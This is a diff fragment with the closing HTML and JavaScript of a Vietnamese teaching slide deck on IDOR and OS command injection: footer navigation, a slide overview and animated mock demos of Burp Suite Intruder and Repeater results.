+            </div>
+
+            <button onclick="goToSlide(1)" class="px-4 py-2.5 rounded-xl bg-slate-900 hover:bg-slate-700 border border-slate-600 text-slate-200 text-xs font-bold flex items-center gap-2 transition shrink-0">
+              <i data-lucide="rotate-ccw" class="w-3.5 h-3.5"></i> Quay lại Slide 1
+            </button>
+          </div>
+        </div>
+      </section>
+
+    </div>
+  </main>
+
+  <!-- Bottom Navigation Footer -->
+  <footer class="w-full px-6 md:px-10 py-3 border-t border-slate-800/80 bg-slate-900/80 backdrop-blur-md flex items-center justify-between shrink-0 z-30">
+    <!-- Left: Keyboard hints + current slide title -->
+    <div class="flex items-center gap-3 min-w-0">
+      <div class="hidden md:flex items-center gap-1.5 text-[11px] text-slate-400 shrink-0">
+        <kbd class="px-1.5 py-0.5 rounded bg-slate-800 border border-slate-700 font-mono text-slate-300">←</kbd>
+        <kbd class="px-1.5 py-0.5 rounded bg-slate-800 border border-slate-700 font-mono text-slate-300">→</kbd>
+        <span>Chuyển slide</span>
+        <span class="mx-1 text-slate-700">•</span>
+        <kbd class="px-1.5 py-0.5 rounded bg-slate-800 border border-slate-700 font-mono text-slate-300">F</kbd>
+        <span>Toàn màn hình</span>
+      </div>
+      <span class="hidden lg:inline text-slate-700">|</span>
+      <span id="footerSlideTitle" class="text-xs text-slate-400 truncate max-w-[260px] xl:max-w-md font-medium">
+        Phân tích chuyên sâu: IDOR &amp; OS Command Injection
+      </span>
+    </div>
+
+    <!-- Center: Mini progress dots (desktop) -->
+    <div id="slideDots" class="hidden xl:flex items-center gap-1.5"></div>
+
+    <!-- Right: Page Counter & Controls -->
+    <div class="flex items-center gap-2.5 shrink-0">
+      <button onclick="toggleFullscreen()" title="Toàn màn hình (Phím F)" class="p-2 rounded-lg bg-slate-800 hover:bg-slate-700 border border-slate-700 text-slate-300 hover:text-white transition">
+        <i data-lucide="maximize-2" class="w-4 h-4"></i>
+      </button>
+
+      <div class="flex items-center bg-slate-800 border border-slate-700 rounded-xl p-1 gap-1">
+        <button id="btnPrev" onclick="prevSlide()" class="px-2.5 py-1.5 rounded-lg hover:bg-slate-700 disabled:opacity-35 disabled:hover:bg-transparent text-slate-200 flex items-center gap-1 text-xs font-semibold transition">
+          <i data-lucide="chevron-left" class="w-4 h-4"></i>
+          <span class="hidden sm:inline">Trước</span>
+        </button>
+
+        <button onclick="toggleOverview()" id="slideCounter" title="Mở danh sách slide (Phím G)" class="px-3 py-1.5 rounded-lg bg-slate-900 hover:bg-slate-950 font-mono text-xs font-bold text-white border border-slate-700/80 transition min-w-[74px] text-center">
+          01 / 12
+        </button>
+
+        <button id="btnNext" onclick="nextSlide()" class="px-2.5 py-1.5 rounded-lg bg-sky-500/20 hover:bg-sky-500/30 border border-sky-500/40 disabled:opacity-35 disabled:bg-transparent disabled:border-transparent text-sky-200 flex items-center gap-1 text-xs font-semibold transition">
+          <span class="hidden sm:inline">Tiếp</span>
+          <i data-lucide="chevron-right" class="w-4 h-4"></i>
+        </button>
+      </div>
+    </div>
+  </footer>
+
+  <!-- Slide Overview Modal (Shortcut: G) -->
+  <div id="overviewModal" class="fixed inset-0 bg-slate-950/85 backdrop-blur-md z-50 hidden items-center justify-center p-6">
+    <div class="bg-slate-900 border border-slate-700 rounded-2xl max-w-5xl w-full max-h-[85vh] flex flex-col overflow-hidden shadow-2xl">
+      <div class="px-6 py-4 border-b border-slate-800 flex items-center justify-between">
+        <div class="flex items-center gap-2.5">
+          <i data-lucide="layout-grid" class="w-5 h-5 text-sky-400"></i>
+          <h3 class="font-bold text-white text-base">Điều hướng nhanh — 12 Slides</h3>
+        </div>
+        <button onclick="toggleOverview()" class="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white transition">
+          <i data-lucide="x" class="w-4 h-4"></i>
+        </button>
+      </div>
+      <div id="overviewGrid" class="p-6 grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3.5 overflow-y-auto custom-scroll"></div>
+    </div>
+  </div>
+
+  <!-- Vanilla JS Logic -->
+  <script>
+    const slides = Array.from(document.querySelectorAll('.slide'));
+    const totalSlides = slides.length;
+    let currentSlide = 1;
+
+    const progressBar = document.getElementById('progressBar');
+    const slideCounter = document.getElementById('slideCounter');
+    const sectionBadge = document.getElementById('sectionBadge');
+    const footerSlideTitle = document.getElementById('footerSlideTitle');
+    const btnPrev = document.getElementById('btnPrev');
+    const btnNext = document.getElementById('btnNext');
+    const slideDots = document.getElementById('slideDots');
+    const overviewModal = document.getElementById('overviewModal');
+    const overviewGrid = document.getElementById('overviewGrid');
+    const stage = document.getElementById('stage');
+
+    function pad(n) {
+      return String(n).padStart(2, '0');
+    }
+
+    function updateBadgeStyle(theme) {
+      sectionBadge.className = 'px-2.5 py-0.5 rounded-full text-xs font-semibold border ';
+      if (theme === 'danger') {
+        sectionBadge.className += 'bg-red-500/15 text-red-300 border-red-500/35';
+      } else if (theme === 'safe') {
+        sectionBadge.className += 'bg-emerald-500/15 text-emerald-300 border-emerald-500/35';
+      } else {
+        sectionBadge.className += 'bg-sky-500/15 text-sky-300 border-sky-500/35';
+      }
+    }
+
+    function renderDots() {
+      slideDots.innerHTML = '';
+      for (let i = 1; i <= totalSlides; i++) {
+        const dot = document.createElement('button');
+        dot.title = `Slide ${pad(i)}`;
+        dot.onclick = () => goToSlide(i);
+        const isActive = i === currentSlide;
+        dot.className = isActive
+          ? 'w-6 h-2 rounded-full bg-sky-400 transition-all duration-300'
+          : 'w-2 h-2 rounded-full bg-slate-700 hover:bg-slate-500 transition-all duration-200';
+        slideDots.appendChild(dot);
+      }
+    }
+
+    function renderOverviewGrid() {
+      overviewGrid.innerHTML = '';
+      slides.forEach((el, idx) => {
+        const num = idx + 1;
+        const title = el.dataset.title || `Slide ${num}`;
+        const sec = el.dataset.section || '';
+        const theme = el.dataset.theme || 'sky';
+        const isCurrent = num === currentSlide;
+
+        const accent = theme === 'danger' ? 'text-red-400' : theme === 'safe' ? 'text-emerald-400' : 'text-sky-400';
+        const border = isCurrent ? 'border-sky-400 bg-sky-500/10 ring-1 ring-sky-400/50' : 'border-slate-700/80 bg-slate-800/70 hover:bg-slate-800 hover:border-slate-500';
+
+        const card = document.createElement('button');
+        card.className = `text-left p-4 rounded-xl border transition flex flex-col justify-between gap-2 ${border}`;
+        card.onclick = () => {
+          goToSlide(num);
+          toggleOverview(false);
+        };
+        card.innerHTML = `
+          <div class="flex items-center justify-between w-full">
+            <span class="font-mono text-xs font-extrabold ${accent}">${pad(num)} / ${pad(totalSlides)}</span>
+            <span class="text-[10px] uppercase tracking-wider text-slate-400 font-semibold">${sec}</span>
+          </div>
+          <div class="text-sm font-bold text-white leading-snug">${title}</div>
+        `;
+        overviewGrid.appendChild(card);
+      });
+    }
+
+    function goToSlide(n) {
+      if (n < 1 || n > totalSlides) return;
+      currentSlide = n;
+
+      slides.forEach((el, idx) => {
+        if (idx + 1 === currentSlide) {
+          el.classList.add('active');
+        } else {
+          el.classList.remove('active');
+        }
+      });
+
+      const activeEl = slides[currentSlide - 1];
+      const pct = (currentSlide / totalSlides) * 100;
+      progressBar.style.width = `${pct}%`;
+      slideCounter.textContent = `${pad(currentSlide)} / ${pad(totalSlides)}`;
+      sectionBadge.textContent = activeEl.dataset.section || '';
+      footerSlideTitle.textContent = activeEl.dataset.title || '';
+      updateBadgeStyle(activeEl.dataset.theme);
+
+      btnPrev.disabled = currentSlide === 1;
+      btnNext.disabled = currentSlide === totalSlides;
+
+      stage.scrollTop = 0;
+      renderDots();
+      if (!overviewModal.classList.contains('hidden')) {
+        renderOverviewGrid();
+      }
+    }
+
+    function nextSlide() {
+      if (currentSlide < totalSlides) goToSlide(currentSlide + 1);
+    }
+
+    function prevSlide() {
+      if (currentSlide > 1) goToSlide(currentSlide - 1);
+    }
+
+    function toggleOverview(forceState) {
+      const isHidden = overviewModal.classList.contains('hidden');
+      const shouldShow = typeof forceState === 'boolean' ? forceState : isHidden;
+      if (shouldShow) {
+        renderOverviewGrid();
+        overviewModal.classList.remove('hidden');
+        overviewModal.classList.add('flex');
+      } else {
+        overviewModal.classList.add('hidden');
+        overviewModal.classList.remove('flex');
+      }
+    }
+
+    function toggleFullscreen() {
+      if (!document.fullscreenElement) {
+        document.documentElement.requestFullscreen?.();
+      } else {
+        document.exitFullscreen?.();
+      }
+    }
+
+    // Keyboard Shortcuts
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'Escape' && !overviewModal.classList.contains('hidden')) {
+        toggleOverview(false);
+        return;
+      }
+      if (!overviewModal.classList.contains('hidden')) return;
+
+      if (e.key === 'ArrowRight' || e.key === 'PageDown' || e.key === ' ') {
+        if (document.activeElement?.tagName !== 'BUTTON') {
+          e.preventDefault();
+          nextSlide();
+        }
+      } else if (e.key === 'ArrowLeft' || e.key === 'PageUp') {
+        e.preventDefault();
+        prevSlide();
+      } else if (e.key === 'Home') {
+        goToSlide(1);
+      } else if (e.key === 'End') {
+        goToSlide(totalSlides);
+      } else if (e.key.toLowerCase() === 'g') {
+        toggleOverview();
+      } else if (e.key.toLowerCase() === 'f') {
+        toggleFullscreen();
+      }
+    });
+
+    // Click outside modal to close
+    overviewModal.addEventListener('click', (e) => {
+      if (e.target === overviewModal) toggleOverview(false);
+    });
+
+    // =========================================================================
+    // INTERACTIVE MINI-DEMOS INSIDE SLIDES
+    // =========================================================================
+
+    // Slide 3: Highlight Pulse Animation on URL & DevTools Payload
+    function toggleSlide3Demo() {
+      const box1 = document.getElementById('slide3BrowserAttack');
+      const box2 = document.getElementById('slide3PayloadBox');
+      [box1, box2].forEach(el => {
+        if (!el) return;
+        el.classList.add('ring-2', 'ring-red-400', 'scale-[1.015]');
+        setTimeout(() => {
+          el.classList.remove('ring-2', 'ring-red-400', 'scale-[1.015]');
+        }, 900);
+      });
+    }
+
+    // Slide 5: Burp Suite Intruder Results (ID 1..30)
+    const sampleFiles = [
+      'Bao_cao_Ca_nhan_Hai.pdf',
+      'Hop_dong_Lao_dong_NV02.pdf',
+      'Bang_luong_Giam_Doc.txt',
+      'Bao_cao_Tai_chinh_Q4.xlsx',
+      'Danh_sach_Khach_hang_VIP.csv',
+      'Tai_lieu_Dau_thau_Mat.docx',
+      'Thong_tin_The_Ngan_hang.txt',
+      'Ho_so_Nhan_su_Ke_toan.pdf',
+      'Key_Backup_Database.env',
+      'Chien_luoc_Kinh_doanh_2026.pdf'
+    ];
+
+    function buildIntruderRow(id) {
+      const fileName = sampleFiles[(id - 1) % sampleFiles.length].replace(/(\.[^.]+)$/, id > 10 ? `_v${id}$1` : '$1');
+      const isHighlight = id === 3 || id === 9 || id === 1;
+      const length = 1420 + ((id * 379) % 8500);
+      return `
+        <tr class="${isHighlight ? 'bg-red-500/15 text-red-200 font-semibold' : 'hover:bg-slate-800/60'}">
+          <td class="py-1.5 px-3 text-slate-500">${id}</td>
+          <td class="py-1.5 px-3 font-bold ${isHighlight ? 'text-red-300' : 'text-amber-300'}">${id}</td>
+          <td class="py-1.5 px-3"><span class="px-1.5 py-0.5 rounded bg-emerald-500/20 text-emerald-300 text-[11px] font-bold">200 OK</span></td>
+          <td class="py-1.5 px-3 text-slate-400">${length} B</td>
+          <td class="py-1.5 px-3 truncate max-w-[220px]">${fileName}</td>
+        </tr>
+      `;
+    }
+
+    function populateIntruderFull() {
+      const tbody = document.getElementById('intruderTableBody');
+      if (!tbody) return;
+      let html = '';
+      for (let i = 1; i <= 30; i++) {
+        html += buildIntruderRow(i);
+      }
+      tbody.innerHTML = html;
+    }
+
+    let intruderTimer = null;
+    function runIntruderDemo() {
+      const tbody = document.getElementById('intruderTableBody');
+      const stats = document.getElementById('intruderStats');
+      const prog = document.getElementById('intruderProgress');
+      if (!tbody) return;
+
+      if (intruderTimer) clearInterval(intruderTimer);
+      tbody.innerHTML = '';
+      let id = 1;
+      prog.style.width = '0%';
+      stats.textContent = '0/30 Requests • Scanning...';
+
+      intruderTimer = setInterval(() => {
+        tbody.insertAdjacentHTML('beforeend', buildIntruderRow(id));
+        tbody.parentElement.parentElement.scrollTop = tbody.parentElement.parentElement.scrollHeight;
+        prog.style.width = `${(id / 30) * 100}%`;
+        stats.textContent = `${id}/30 Requests • ${id} × 200 OK (${Math.round((id / 30) * 100)}% Exposed)`;
+        if (id >= 30) {
+          clearInterval(intruderTimer);
+          intruderTimer = null;
+          tbody.parentElement.parentElement.scrollTop = 0;
+        }
+        id++;
+      }, 65);
+    }
+
+    // Slide 9: Burp Repeater Send Animation
+    function sendRepeaterDemo() {
+      const pane = document.getElementById('repeaterResponsePane');
+      const status = document.getElementById('repeaterStatus');
+      if (!pane || !status) return;
+      pane.style.opacity = '0.25';
+      status.textContent = 'Sending payload...';
+      setTimeout(() => {
+        pane.style.opacity = '1';
+        status.textContent = '200 OK • 482 bytes (Exploited!)';
+      }, 320);
+    }
+
+    // Init on load
+    document.addEventListener('DOMContentLoaded', () => {
+      lucide.createIcons();
+      populateIntruderFull();
+      goToSlide(1);
+    });
+  </script>
+</body>
+</html>
